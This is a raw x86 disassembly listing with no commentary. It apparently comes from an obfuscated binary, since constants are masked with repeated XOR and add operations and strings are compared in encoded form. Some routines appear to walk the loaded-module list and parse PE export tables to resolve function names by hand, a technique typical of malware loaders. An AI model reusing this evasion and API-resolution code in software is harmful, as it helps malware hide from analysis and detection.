  4277ae:	mov    edi,DWORD PTR [ebp-0x2c]
  4277b1:	mov    bx,WORD PTR [ebp+0x8]
  4277b5:	xor    edi,esi
  4277b7:	add    edi,eax
  4277b9:	cmp    bx,di
  4277bc:	ja     0x4277cc
  4277be:	movzx  edi,WORD PTR [ebp+0x8]
  4277c2:	movzx  ebx,WORD PTR [ebp-0x8]
  4277c6:	add    edi,ebx
  4277c8:	mov    WORD PTR [ebp+0x8],di
  4277cc:	mov    edi,DWORD PTR [ebp-0x20]
  4277cf:	mov    bx,WORD PTR [ebp-0x4]
  4277d3:	xor    edi,esi
  4277d5:	add    edi,eax
  4277d7:	cmp    bx,di
  4277da:	jb     0x4277fa
  4277dc:	mov    edi,DWORD PTR [ebp-0x2c]
  4277df:	mov    bx,WORD PTR [ebp-0x4]
  4277e3:	xor    edi,esi
  4277e5:	add    edi,eax
  4277e7:	cmp    bx,di
  4277ea:	ja     0x4277fa
  4277ec:	movzx  edi,WORD PTR [ebp-0x4]
  4277f0:	movzx  ebx,WORD PTR [ebp-0x8]
  4277f4:	add    edi,ebx
  4277f6:	mov    WORD PTR [ebp-0x4],di
  4277fa:	mov    di,WORD PTR [ebp-0x4]
  4277fe:	mov    bx,WORD PTR [ebp+0x8]
  427802:	cmp    bx,di
  427805:	jne    0x4278ff
  42780b:	mov    edi,DWORD PTR [ebp-0x1c]
  42780e:	mov    ebx,DWORD PTR [ebp-0x10]
  427811:	xor    edi,ecx
  427813:	lea    edi,[edi+ebx*1+0x3272f1]
  42781a:	mov    DWORD PTR [ebp-0x10],edi
  42781d:	mov    edi,DWORD PTR [ebp-0x1c]
  427820:	mov    ebx,DWORD PTR [ebp-0x14]
  427823:	xor    edi,ecx
  427825:	lea    edi,[edi+ebx*1+0x3272f1]
  42782c:	mov    DWORD PTR [ebp-0x14],edi
  42782f:	mov    edi,DWORD PTR [ebp-0x24]
  427832:	mov    ebx,DWORD PTR [ebp-0x10]
  427835:	mov    di,WORD PTR [ebx+edi*2]
  427839:	mov    WORD PTR [ebp+0x8],di
  42783d:	mov    edi,DWORD PTR [ebp-0x28]
  427840:	mov    ebx,DWORD PTR [ebp-0x14]
  427843:	mov    di,WORD PTR [ebx+edi*2]
  427847:	mov    WORD PTR [ebp-0x4],di
  42784b:	mov    edi,DWORD PTR [ebp-0xc]
  42784e:	mov    bx,WORD PTR [ebp+0x8]
  427852:	xor    edi,esi
  427854:	add    edi,eax
  427856:	cmp    bx,di
  427859:	jne    0x42776f
  42785f:	mov    eax,DWORD PTR [ebp-0x18]
  427862:	mov    esi,DWORD PTR [ebp-0xc]
  427865:	xor    eax,ecx
  427867:	add    eax,edx
  427869:	imul   eax,esi
  42786c:	mov    DWORD PTR [ebp-0xc],eax
  42786f:	jmp    0x427883
  427871:	mov    eax,DWORD PTR [ebp-0xc]
  427874:	mov    esi,DWORD PTR [ebp-0x18]
  427877:	xor    eax,ecx
  427879:	lea    eax,[eax+esi*1+0x3272f1]
  427880:	mov    DWORD PTR [ebp-0x18],eax
  427883:	mov    eax,DWORD PTR [ebp-0x24]
  427886:	sub    eax,edx
  427888:	xor    eax,ecx
  42788a:	mov    DWORD PTR [ebp-0x30],eax
  42788d:	mov    eax,DWORD PTR [ebp-0x28]
  427890:	sub    eax,edx
  427892:	xor    eax,ecx
  427894:	mov    DWORD PTR [ebp-0x34],eax
  427897:	mov    eax,DWORD PTR [ebp-0x34]
  42789a:	mov    esi,DWORD PTR [ebp-0x1c]
  42789d:	xor    esi,ecx
  42789f:	add    esi,edx
  4278a1:	xor    eax,ecx
  4278a3:	add    eax,0x3272f1
  4278a8:	imul   esi,eax
  4278ab:	mov    eax,DWORD PTR [ebp-0x14]
  4278ae:	movzx  eax,WORD PTR [esi+eax*1]
  4278b2:	mov    esi,DWORD PTR [ebp-0x30]
  4278b5:	mov    edi,DWORD PTR [ebp-0x1c]
  4278b8:	xor    esi,ecx
  4278ba:	add    esi,edx
  4278bc:	xor    edi,ecx
  4278be:	add    edi,edx
  4278c0:	imul   edi,esi
  4278c3:	mov    esi,DWORD PTR [ebp-0x10]
  4278c6:	movzx  esi,WORD PTR [edi+esi*1]
  4278ca:	sub    eax,edx
  4278cc:	sub    esi,edx
  4278ce:	xor    eax,ecx
  4278d0:	xor    esi,ecx
  4278d2:	cmp    esi,eax
  4278d4:	jne    0x4278ff
  4278d6:	mov    eax,DWORD PTR [ebp-0x30]
  4278d9:	mov    esi,DWORD PTR [ebp-0x1c]
  4278dc:	xor    eax,ecx
  4278de:	add    eax,0x3272f1
  4278e3:	xor    esi,ecx
  4278e5:	add    esi,edx
  4278e7:	imul   esi,eax
  4278ea:	mov    eax,DWORD PTR [ebp-0x10]
  4278ed:	movzx  eax,WORD PTR [esi+eax*1]
  4278f1:	mov    esi,DWORD PTR [ebp-0xc]
  4278f4:	sub    eax,edx
  4278f6:	xor    eax,ecx
  4278f8:	cmp    eax,esi
  4278fa:	mov    eax,DWORD PTR [ebp-0xc]
  4278fd:	je     0x427902
  4278ff:	mov    eax,DWORD PTR [ebp-0x18]
  427902:	pop    edi
  427903:	xor    eax,ecx
  427905:	pop    esi
  427906:	add    eax,edx
  427908:	pop    ebx
  427909:	leave  
  42790a:	ret    0x8
  42790d:	push   ebp
  42790e:	mov    ebp,esp
  427910:	push   ecx
  427911:	mov    cx,WORD PTR [eax]
  427914:	push   esi
  427915:	mov    esi,0x3b5a
  42791a:	sub    cx,si
  42791d:	mov    esi,0x8a98
  427922:	xor    cx,si
  427925:	mov    esi,0x4e3e
  42792a:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  427931:	mov    edx,0xf89c85a5
  427936:	cmp    cx,si
  427939:	je     0x427998
  42793b:	push   ebx
  42793c:	push   edi
  42793d:	movzx  ecx,cx
  427940:	mov    edi,0xffcd8d0f
  427945:	mov    esi,0x75108aa
  42794a:	mov    ebx,0x4f9a
  42794f:	cmp    cx,bx
  427952:	jne    0x427957
  427954:	mov    DWORD PTR [ebp-0x4],edx
  427957:	lea    edx,[edi+0x1]
  42795a:	xor    edx,esi
  42795c:	mov    edi,edx
  42795e:	xor    edi,esi
  427960:	mov    cx,WORD PTR [eax+edi*2+0x64e5e2]
  427968:	mov    ebx,0x3b5a
  42796d:	sub    cx,bx
  427970:	mov    ebx,0x8a98
  427975:	xor    cx,bx
  427978:	mov    ebx,0x4e3e
  42797d:	cmp    cx,bx
  427980:	jne    0x42794a
  427982:	mov    ecx,DWORD PTR [ebp-0x4]
  427985:	pop    edi
  427986:	pop    ebx
  427987:	cmp    ecx,0xf89c85a4
  42798d:	je     0x427998
  42798f:	xor    ecx,esi
  427991:	lea    eax,[eax+ecx*2+0x64e5e4]
  427998:	pop    esi
  427999:	leave  
  42799a:	ret    
  42799b:	push   ebp
  42799c:	mov    ebp,esp
  42799e:	push   ecx
  42799f:	push   esi
  4279a0:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  4279a7:	mov    esi,0xf89c85a5
  4279ac:	call   0x42790d
  4279b1:	mov    cl,BYTE PTR [eax]
  4279b3:	dec    cl
  4279b5:	xor    cl,0x7c
  4279b8:	cmp    cl,0x83
  4279bb:	je     0x427a20
  4279bd:	push   ebx
  4279be:	push   edi
  4279bf:	mov    edx,eax
  4279c1:	mov    edi,0xffcd8d0f
  4279c6:	mov    ecx,0x75108aa
  4279cb:	mov    dx,WORD PTR [edx]
  4279ce:	mov    ebx,0x3b5a
  4279d3:	sub    dx,bx
  4279d6:	mov    ebx,0x8a98
  4279db:	xor    dx,bx
  4279de:	mov    ebx,0x4e4c
  4279e3:	cmp    dx,bx
  4279e6:	jne    0x4279eb
  4279e8:	mov    DWORD PTR [ebp-0x4],esi
  4279eb:	lea    esi,[edi+0x1]
  4279ee:	xor    esi,ecx
  4279f0:	mov    edi,esi
  4279f2:	xor    edi,ecx
  4279f4:	lea    edx,[eax+edi*2+0x64e5e2]
  4279fb:	mov    bl,BYTE PTR [edx]
  4279fd:	dec    bl
  4279ff:	xor    bl,0x7c
  427a02:	cmp    bl,0x83
  427a05:	jne    0x4279cb
  427a07:	mov    edx,DWORD PTR [ebp-0x4]
  427a0a:	pop    edi
  427a0b:	pop    ebx
  427a0c:	cmp    edx,0xf89c85a4
  427a12:	je     0x427a20
  427a14:	xor    edx,ecx
  427a16:	xor    ecx,ecx
  427a18:	mov    WORD PTR [eax+edx*2+0x64e5e2],cx
  427a20:	pop    esi
  427a21:	leave  
  427a22:	ret    
  427a23:	push   ebp
  427a24:	mov    ebp,esp
  427a26:	push   ecx
  427a27:	push   esi
  427a28:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  427a2f:	mov    esi,0xf89c85a5
  427a34:	call   0x42790d
  427a39:	mov    cx,WORD PTR [eax]
  427a3c:	mov    edx,0x3b5a
  427a41:	sub    cx,dx
  427a44:	mov    edx,0x8a98
  427a49:	xor    cx,dx
  427a4c:	mov    edx,0x4e3e
  427a51:	cmp    cx,dx
  427a54:	je     0x427aad
  427a56:	push   ebx
  427a57:	push   edi
  427a58:	movzx  ecx,cx
  427a5b:	mov    edx,0xffcd8d0f
  427a60:	mov    edi,0x75108aa
  427a65:	mov    ebx,0x4e4c
  427a6a:	cmp    cx,bx
  427a6d:	jne    0x427a72
  427a6f:	mov    DWORD PTR [ebp-0x4],esi
  427a72:	lea    esi,[edx+0x1]
  427a75:	xor    esi,edi
  427a77:	mov    edx,esi
  427a79:	xor    edx,edi
  427a7b:	mov    cx,WORD PTR [eax+edx*2+0x64e5e2]
  427a83:	mov    ebx,0x3b5a
  427a88:	sub    cx,bx
  427a8b:	mov    ebx,0x8a98
  427a90:	xor    cx,bx
  427a93:	mov    ebx,0x4e3e
  427a98:	cmp    cx,bx
  427a9b:	jne    0x427a65
  427a9d:	cmp    DWORD PTR [ebp-0x4],0xf89c85a4
  427aa4:	pop    edi
  427aa5:	pop    ebx
  427aa6:	je     0x427aad
  427aa8:	xor    eax,eax
  427aaa:	inc    eax
  427aab:	jmp    0x427aaf
  427aad:	xor    eax,eax
  427aaf:	pop    esi
  427ab0:	leave  
  427ab1:	ret    
  427ab2:	push   ebp
  427ab3:	mov    ebp,esp
  427ab5:	push   ecx
  427ab6:	mov    eax,DWORD PTR [ebp+0x8]
  427ab9:	movzx  ecx,WORD PTR [eax]
  427abc:	push   esi
  427abd:	lea    eax,[ecx-0x3b5a]
  427ac3:	mov    esi,0x8a98
  427ac8:	push   edi
  427ac9:	xor    eax,esi
  427acb:	mov    edi,0x4e3e
  427ad0:	mov    DWORD PTR [ebp-0x4],edx
  427ad3:	cmp    ax,di
  427ad6:	je     0x427b03
  427ad8:	mov    eax,DWORD PTR [ebp+0x8]
  427adb:	sub    eax,edx
  427add:	mov    DWORD PTR [ebp+0x8],eax
  427ae0:	jmp    0x427ae5
  427ae2:	mov    eax,DWORD PTR [ebp+0x8]
  427ae5:	mov    WORD PTR [edx],cx
  427ae8:	add    edx,0x2
  427aeb:	movzx  edi,WORD PTR [eax+edx*1]
  427aef:	mov    ecx,edi
  427af1:	add    edi,0xffffc4a6
  427af7:	xor    edi,esi
  427af9:	mov    eax,0x4e3e
  427afe:	cmp    di,ax
  427b01:	jne    0x427ae2
  427b03:	xor    eax,eax
  427b05:	pop    edi
  427b06:	mov    WORD PTR [edx],ax
  427b09:	mov    eax,DWORD PTR [ebp-0x4]
  427b0c:	pop    esi
  427b0d:	leave  
  427b0e:	ret    0x4
  427b11:	push   ebp
  427b12:	mov    ebp,esp
  427b14:	sub    esp,0x18
  427b17:	mov    DWORD PTR [ebp-0x8],0xf89c85a5
  427b1e:	mov    DWORD PTR [ebp-0x18],0xf89c85ba
  427b25:	mov    ecx,DWORD PTR [ebp-0x8]
  427b28:	push   esi
  427b29:	mov    eax,0x75108aa
  427b2e:	xor    ecx,eax
  427b30:	mov    esi,0x3272f1
  427b35:	add    ecx,esi
  427b37:	mov    DWORD PTR [ebp-0x4],ecx
  427b3a:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  427b41:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  427b48:	push   edi
  427b49:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  427b50:	jmp    0x427bf1
  427b55:	mov    ecx,DWORD PTR [ebp-0x4]
  427b58:	mov    edx,DWORD PTR [ebp+0x10]
  427b5b:	sub    edx,ecx
  427b5d:	mov    ecx,DWORD PTR [ebp-0xc]
  427b60:	xor    ecx,eax
  427b62:	add    ecx,esi
  427b64:	cmp    edx,ecx
  427b66:	jbe    0x427b83
  427b68:	mov    edx,DWORD PTR [ebp-0x4]
  427b6b:	add    edx,DWORD PTR [ebp+0x8]
  427b6e:	mov    ecx,DWORD PTR [ebp-0x4]
  427b71:	add    ecx,DWORD PTR [ebp+0xc]
  427b74:	mov    edi,DWORD PTR [ecx]
  427b76:	mov    DWORD PTR [edx],edi
  427b78:	mov    ecx,DWORD PTR [ecx+0x4]
  427b7b:	mov    DWORD PTR [edx+0x4],ecx
  427b7e:	mov    ecx,DWORD PTR [ebp-0xc]
  427b81:	jmp    0x427bd0
  427b83:	mov    ecx,DWORD PTR [ebp-0x4]
  427b86:	mov    edx,DWORD PTR [ebp+0x10]
  427b89:	sub    edx,ecx
  427b8b:	mov    ecx,DWORD PTR [ebp-0x10]
  427b8e:	xor    ecx,eax
  427b90:	add    ecx,esi
  427b92:	cmp    edx,ecx
  427b94:	mov    ecx,DWORD PTR [ebp-0x4]
  427b97:	jbe    0x427bab
  427b99:	add    ecx,DWORD PTR [ebp+0x8]
  427b9c:	mov    edx,DWORD PTR [ebp-0x4]
  427b9f:	add    edx,DWORD PTR [ebp+0xc]
  427ba2:	mov    edx,DWORD PTR [edx]
  427ba4:	mov    DWORD PTR [ecx],edx
  427ba6:	mov    ecx,DWORD PTR [ebp-0x10]
  427ba9:	jmp    0x427bd0
  427bab:	mov    edx,DWORD PTR [ebp+0x10]
  427bae:	sub    edx,ecx
  427bb0:	mov    ecx,DWORD PTR [ebp-0x14]
  427bb3:	xor    ecx,eax
  427bb5:	add    ecx,esi
  427bb7:	cmp    edx,ecx
  427bb9:	mov    ecx,DWORD PTR [ebp-0x4]
  427bbc:	jbe    0x427be1
  427bbe:	add    ecx,DWORD PTR [ebp+0x8]
  427bc1:	mov    edx,DWORD PTR [ebp-0x4]
  427bc4:	add    edx,DWORD PTR [ebp+0xc]
  427bc7:	mov    dx,WORD PTR [edx]
  427bca:	mov    WORD PTR [ecx],dx
  427bcd:	mov    ecx,DWORD PTR [ebp-0x14]
  427bd0:	mov    edx,DWORD PTR [ebp-0x4]
  427bd3:	xor    ecx,eax
  427bd5:	lea    ecx,[ecx+edx*1+0x3272f1]
  427bdc:	mov    DWORD PTR [ebp-0x4],ecx
  427bdf:	jmp    0x427bf1
  427be1:	add    ecx,DWORD PTR [ebp+0x8]
  427be4:	mov    edx,DWORD PTR [ebp-0x4]
  427be7:	add    edx,DWORD PTR [ebp+0xc]
  427bea:	mov    dl,BYTE PTR [edx]
  427bec:	mov    BYTE PTR [ecx],dl
  427bee:	inc    DWORD PTR [ebp-0x4]
  427bf1:	mov    ecx,DWORD PTR [ebp-0x18]
  427bf4:	mov    edx,DWORD PTR [ebp+0x10]
  427bf7:	xor    ecx,eax
  427bf9:	add    ecx,esi
  427bfb:	imul   ecx,edx
  427bfe:	mov    edx,DWORD PTR [ebp-0x8]
  427c01:	mov    edi,DWORD PTR [ebp-0x4]
  427c04:	xor    edx,eax
  427c06:	lea    edx,[edx+edi*1+0x3272f1]
  427c0d:	cmp    edx,ecx
  427c0f:	jb     0x427b55
  427c15:	pop    edi
  427c16:	pop    esi
  427c17:	leave  
  427c18:	ret    0xc
  427c1b:	push   ebp
  427c1c:	mov    ebp,esp
  427c1e:	sub    esp,0xc
  427c21:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  427c28:	push   esi
  427c29:	mov    esi,eax
  427c2b:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  427c32:	mov    edx,DWORD PTR [ebp-0x4]
  427c35:	mov    eax,0x75108aa
  427c3a:	xor    edx,eax
  427c3c:	mov    ecx,0x3272f1
  427c41:	add    edx,ecx
  427c43:	cmp    esi,edx
  427c45:	je     0x427c87
  427c47:	push   ebx
  427c48:	push   edi
  427c49:	mov    edx,DWORD PTR [ebp-0x8]
  427c4c:	mov    ebx,DWORD PTR [ebp+0x8]
  427c4f:	xor    edx,eax
  427c51:	mov    edi,0xffcd8d0f
  427c56:	sub    edi,edx
  427c58:	add    esi,edi
  427c5a:	lea    edx,[esi-0x3272f1]
  427c60:	xor    edx,eax
  427c62:	mov    DWORD PTR [ebp-0xc],edx
  427c65:	mov    edx,DWORD PTR [ebp-0x4]
  427c68:	mov    edi,DWORD PTR [ebp-0xc]
  427c6b:	xor    dl,0xaa
  427c6e:	sub    dl,0xf
  427c71:	xor    edi,eax
  427c73:	mov    BYTE PTR [edi+ebx*1+0x3272f1],dl
  427c7a:	mov    edx,DWORD PTR [ebp-0x4]
  427c7d:	xor    edx,eax
  427c7f:	add    edx,ecx
  427c81:	cmp    esi,edx
  427c83:	jne    0x427c49
  427c85:	pop    edi
  427c86:	pop    ebx
  427c87:	pop    esi
  427c88:	leave  
  427c89:	ret    0x4
  427c8c:	push   ebp
  427c8d:	mov    ebp,esp
  427c8f:	sub    esp,0x21c
  427c95:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  427c9c:	mov    DWORD PTR [ebp-0x14],0xf89c85ba
  427ca3:	mov    eax,DWORD PTR [ebp+0x10]
  427ca6:	mov    eax,DWORD PTR [ebp-0x4]
  427ca9:	mov    ecx,DWORD PTR [ebp+0x8]
  427cac:	push   esi
  427cad:	push   edi
  427cae:	mov    edi,0x75108aa
  427cb3:	xor    eax,edi
  427cb5:	mov    esi,0x3272f1
  427cba:	add    eax,esi
  427cbc:	cmp    eax,ecx
  427cbe:	mov    eax,DWORD PTR [ebp-0x4]
  427cc1:	jne    0x427ccc
  427cc3:	xor    eax,edi
  427cc5:	add    eax,esi
  427cc7:	jmp    0x427d78
  427ccc:	mov    ecx,DWORD PTR [ebp+0xc]
  427ccf:	xor    eax,edi
  427cd1:	add    eax,esi
  427cd3:	cmp    eax,ecx
  427cd5:	jne    0x427cdc
  427cd7:	mov    eax,DWORD PTR [ebp-0x4]
  427cda:	jmp    0x427cc3
  427cdc:	lea    eax,[ebp-0x21c]
  427ce2:	mov    DWORD PTR [ebp-0x8],eax
  427ce5:	mov    eax,DWORD PTR [ebp+0xc]
  427ce8:	mov    DWORD PTR [ebp-0x10],eax
  427ceb:	mov    eax,DWORD PTR [ebp-0x4]
  427cee:	xor    eax,edi
  427cf0:	add    eax,esi
  427cf2:	mov    DWORD PTR [ebp+0x10],eax
  427cf5:	mov    eax,DWORD PTR [ebp+0xc]
  427cf8:	push   ebx
  427cf9:	call   0x427a23
  427cfe:	mov    ebx,eax
  427d00:	mov    eax,DWORD PTR [ebp+0x8]
  427d03:	mov    eax,DWORD PTR [eax+0x14]
  427d06:	jmp    0x427d60
  427d08:	mov    eax,DWORD PTR [ebp+0xc]
  427d0b:	sub    eax,0x8
  427d0e:	mov    DWORD PTR [ebp-0xc],eax
  427d11:	mov    eax,DWORD PTR [ebp-0xc]
  427d14:	mov    eax,DWORD PTR [eax+0x28]
  427d17:	call   0x42790d
  427d1c:	mov    DWORD PTR [ebp+0x10],eax
  427d1f:	push   DWORD PTR [ebp+0x10]
  427d22:	mov    edx,DWORD PTR [ebp-0x8]
  427d25:	call   0x427ab2
  427d2a:	mov    eax,DWORD PTR [ebp-0x4]
  427d2d:	xor    eax,edi
  427d2f:	add    eax,esi
  427d31:	cmp    eax,ebx
  427d33:	jne    0x427d3d
  427d35:	mov    eax,DWORD PTR [ebp-0x8]
  427d38:	call   0x42799b
  427d3d:	mov    eax,DWORD PTR [ebp-0x14]
  427d40:	xor    eax,edi
  427d42:	add    eax,esi
  427d44:	push   eax
  427d45:	push   DWORD PTR [ebp-0x10]
  427d48:	mov    eax,DWORD PTR [ebp-0x8]
  427d4b:	call   0x4276c7
  427d50:	mov    ecx,DWORD PTR [ebp-0x4]
  427d53:	xor    ecx,edi
  427d55:	add    ecx,esi
  427d57:	cmp    eax,ecx
  427d59:	je     0x427d7e
  427d5b:	mov    eax,DWORD PTR [ebp+0xc]
  427d5e:	mov    eax,DWORD PTR [eax]
  427d60:	mov    DWORD PTR [ebp+0xc],eax
  427d63:	mov    eax,DWORD PTR [ebp+0x8]
  427d66:	mov    ecx,DWORD PTR [ebp+0xc]
  427d69:	add    eax,0x14
  427d6c:	cmp    ecx,eax
  427d6e:	jne    0x427d08
  427d70:	mov    eax,DWORD PTR [ebp-0x4]
  427d73:	xor    eax,edi
  427d75:	add    eax,esi
  427d77:	pop    ebx
  427d78:	pop    edi
  427d79:	pop    esi
  427d7a:	leave  
  427d7b:	ret    0xc
  427d7e:	mov    eax,DWORD PTR [ebp-0xc]
  427d81:	mov    eax,DWORD PTR [eax+0x18]
  427d84:	jmp    0x427d77
  427d86:	push   ebp
  427d87:	mov    ebp,esp
  427d89:	mov    eax,DWORD PTR [ebp+0xc]
  427d8c:	sub    esp,0x10
  427d8f:	cmp    DWORD PTR [ebp+0x8],0x0
  427d93:	push   ebx
  427d94:	push   esi
  427d95:	push   edi
  427d96:	je     0x427e4b
  427d9c:	test   eax,eax
  427d9e:	je     0x427e4b
  427da4:	movzx  eax,WORD PTR [eax+0x20]
  427da8:	mov    ecx,eax
  427daa:	mov    DWORD PTR [ebp-0x10],eax
  427dad:	xor    edx,edx
  427daf:	and    DWORD PTR [ebp-0x8],edx
  427db2:	mov    eax,0x8a98
  427db7:	xor    ecx,eax
  427db9:	add    ecx,0x3b5a
  427dbf:	mov    DWORD PTR [ebp-0xc],ecx
  427dc2:	and    DWORD PTR [ebp-0x4],0x0
  427dc6:	xor    ecx,ecx
  427dc8:	push   0x7d
  427dca:	pop    edi
  427dcb:	cmp    cx,WORD PTR [ebp-0xc]
  427dcf:	jae    0x427e35
  427dd1:	lea    esi,[edx-0x3b5a]
  427dd7:	xor    esi,eax
  427dd9:	movzx  ecx,WORD PTR [ebp-0x4]
  427ddd:	mov    ebx,DWORD PTR [ebp+0xc]
  427de0:	lea    ecx,[ebx+ecx*4]
  427de3:	cmp    WORD PTR [ecx+0x2],si
  427de7:	jne    0x427e20
  427de9:	movzx  ecx,WORD PTR [ecx]
  427dec:	mov    edi,0x4e3e
  427df1:	cmp    cx,di
  427df4:	jne    0x427e02
  427df6:	mov    ebx,DWORD PTR [ebp+0x8]
  427df9:	movzx  edi,dx
  427dfc:	cmp    BYTE PTR [edi+ebx*1],0x0
  427e00:	je     0x427e2f
  427e02:	mov    ebx,DWORD PTR [ebp+0x8]
  427e05:	movzx  edi,dx
  427e08:	movsx  di,BYTE PTR [edi+ebx*1]
  427e0d:	mov    ebx,0x3b5a
  427e12:	sub    di,bx
  427e15:	xor    di,ax
  427e18:	cmp    cx,di
  427e1b:	je     0x427e2f
  427e1d:	push   0xffffff83
  427e1f:	pop    edi
  427e20:	inc    DWORD PTR [ebp-0x4]
  427e23:	mov    cx,WORD PTR [ebp-0xc]
  427e27:	cmp    WORD PTR [ebp-0x4],cx
  427e2b:	jb     0x427dd9
  427e2d:	jmp    0x427e35
  427e2f:	inc    DWORD PTR [ebp-0x8]
  427e32:	push   0x7c
  427e34:	pop    edi
  427e35:	mov    esi,DWORD PTR [ebp+0x8]
  427e38:	movzx  ecx,dx
  427e3b:	cmp    BYTE PTR [ecx+esi*1],0x0
  427e3f:	je     0x427e54
  427e41:	inc    edx
  427e42:	cmp    edi,0xffffff83
  427e45:	jne    0x427dc2
  427e4b:	xor    eax,eax
  427e4d:	pop    edi
  427e4e:	pop    esi
  427e4f:	pop    ebx
  427e50:	leave  
  427e51:	ret    0x8
  427e54:	mov    ecx,DWORD PTR [ebp-0x8]
  427e57:	add    ecx,0xffffc4a6
  427e5d:	xor    cx,ax
  427e60:	xor    eax,eax
  427e62:	cmp    cx,WORD PTR [ebp-0x10]
  427e66:	sete   al
  427e69:	jmp    0x427e4d
  427e6b:	push   ebp
  427e6c:	mov    ebp,esp
  427e6e:	sub    esp,0x50
  427e71:	push   edi
  427e72:	mov    edi,eax
  427e74:	mov    eax,DWORD PTR [edi+0x1a8]
  427e7a:	cmp    DWORD PTR [eax],0x0
  427e7d:	jne    0x427e86
  427e7f:	xor    eax,eax
  427e81:	jmp    0x427fb7
  427e86:	push   DWORD PTR [ebp+0x8]
  427e89:	push   0x2c
  427e8b:	pop    eax
  427e8c:	call   0x427c1b
  427e91:	mov    edx,DWORD PTR [edi+0x1ac]
  427e97:	lea    eax,[edi+0x22]
  427e9a:	mov    DWORD PTR [ebp-0x4c],eax
  427e9d:	lea    eax,[edi+0x44]
  427ea0:	mov    DWORD PTR [ebp-0x48],eax
  427ea3:	lea    eax,[edi+0x66]
  427ea6:	mov    DWORD PTR [ebp-0x44],eax
  427ea9:	lea    eax,[edi+0x88]
  427eaf:	mov    DWORD PTR [ebp-0x40],eax
  427eb2:	lea    eax,[edi+0xaa]
  427eb8:	mov    DWORD PTR [ebp-0x3c],eax
  427ebb:	lea    eax,[edi+0xcc]
  427ec1:	mov    DWORD PTR [ebp-0x38],eax
  427ec4:	lea    eax,[edi+0xee]
  427eca:	mov    DWORD PTR [ebp-0x34],eax
  427ecd:	lea    eax,[edi+0x110]
  427ed3:	mov    DWORD PTR [ebp-0x30],eax
  427ed6:	lea    eax,[edi+0x132]
  427edc:	mov    DWORD PTR [ebp-0x2c],eax
  427edf:	lea    eax,[edi+0x154]
  427ee5:	push   edi
  427ee6:	mov    DWORD PTR [ebp-0x50],edi
  427ee9:	mov    DWORD PTR [ebp-0x28],eax
  427eec:	call   0x427feb
  427ef1:	push   eax
  427ef2:	mov    eax,DWORD PTR [edi+0x1a8]
  427ef8:	push   DWORD PTR [eax]
  427efa:	call   0x427c8c
  427eff:	mov    DWORD PTR [ebp-0x10],eax
  427f02:	test   eax,eax
  427f04:	je     0x427fb7
  427f0a:	mov    ecx,DWORD PTR [eax+0x3c]
  427f0d:	push   ebx
  427f0e:	push   esi
  427f0f:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  427f13:	add    esi,eax
  427f15:	mov    edi,DWORD PTR [esi+0x24]
  427f18:	mov    ecx,DWORD PTR [esi+0x1c]
  427f1b:	mov    edx,DWORD PTR [esi+0x20]
  427f1e:	mov    ebx,DWORD PTR [esi+0x18]
  427f21:	add    edi,eax
  427f23:	mov    DWORD PTR [ebp-0x20],edi
  427f26:	mov    edi,DWORD PTR [esi+0x14]
  427f29:	add    ecx,eax
  427f2b:	add    edx,eax
  427f2d:	mov    DWORD PTR [ebp-0xc],ecx
  427f30:	mov    DWORD PTR [ebp-0x1c],edx
  427f33:	mov    DWORD PTR [ebp-0x8],edi
  427f36:	cmp    edi,ebx
  427f38:	ja     0x427f3d
  427f3a:	mov    DWORD PTR [ebp-0x8],ebx
  427f3d:	xor    ebx,ebx
  427f3f:	mov    DWORD PTR [ebp-0x18],ebx
  427f42:	cmp    DWORD PTR [ebp-0x8],ebx
  427f45:	jbe    0x427fb5
  427f47:	jmp    0x427f4c
  427f49:	mov    edx,DWORD PTR [ebp-0x1c]
  427f4c:	mov    edi,DWORD PTR [ebp-0x20]
  427f4f:	movzx  edi,WORD PTR [edi+ebx*2]
  427f53:	cmp    ebx,DWORD PTR [esi+0x18]
  427f56:	jae    0x427fb5
  427f58:	cmp    edi,DWORD PTR [esi+0x14]
  427f5b:	jae    0x427fb5
  427f5d:	mov    ebx,DWORD PTR [edx+ebx*4]
  427f60:	mov    edx,DWORD PTR [ebp+0x8]
  427f63:	mov    edi,DWORD PTR [ecx+edi*4]
  427f66:	mov    DWORD PTR [ebp-0x4],edx
  427f69:	lea    edx,[ebp-0x50]
  427f6c:	add    ebx,eax
  427f6e:	add    edi,eax
  427f70:	sub    edx,DWORD PTR [ebp+0x8]
  427f73:	mov    DWORD PTR [ebp-0x14],0xb
  427f7a:	mov    DWORD PTR [ebp-0x24],edx
  427f7d:	mov    edx,DWORD PTR [ebp-0x4]
  427f80:	cmp    DWORD PTR [edx],0x0
  427f83:	jne    0x427fa0
  427f85:	mov    eax,DWORD PTR [ebp-0x24]
  427f88:	push   DWORD PTR [eax+edx*1]
  427f8b:	push   ebx
  427f8c:	call   0x427d86
  427f91:	mov    ecx,DWORD PTR [ebp-0xc]
  427f94:	test   eax,eax
  427f96:	je     0x427f9d
  427f98:	mov    eax,DWORD PTR [ebp-0x4]
  427f9b:	mov    DWORD PTR [eax],edi
  427f9d:	mov    eax,DWORD PTR [ebp-0x10]
  427fa0:	add    DWORD PTR [ebp-0x4],0x4
  427fa4:	dec    DWORD PTR [ebp-0x14]
  427fa7:	jne    0x427f7d
  427fa9:	mov    ebx,DWORD PTR [ebp-0x18]
  427fac:	inc    ebx
  427fad:	mov    DWORD PTR [ebp-0x18],ebx
  427fb0:	cmp    ebx,DWORD PTR [ebp-0x8]
  427fb3:	jb     0x427f49
  427fb5:	pop    esi
  427fb6:	pop    ebx
  427fb7:	pop    edi
  427fb8:	leave  
  427fb9:	ret    0x4
  427fbc:	push   ebp
  427fbd:	mov    ebp,esp
  427fbf:	mov    eax,DWORD PTR [ebp+0x8]
  427fc2:	push   esi
  427fc3:	push   DWORD PTR [eax+0x1e0]
  427fc9:	lea    esi,[eax+0x198]
  427fcf:	mov    eax,DWORD PTR [ebp+0x8]
  427fd2:	call   0x427e6b
  427fd7:	mov    ecx,DWORD PTR [esi]
  427fd9:	mov    DWORD PTR [ecx],eax
  427fdb:	mov    eax,DWORD PTR [esi]
  427fdd:	xor    ecx,ecx
  427fdf:	cmp    DWORD PTR [eax],ecx
  427fe1:	pop    esi
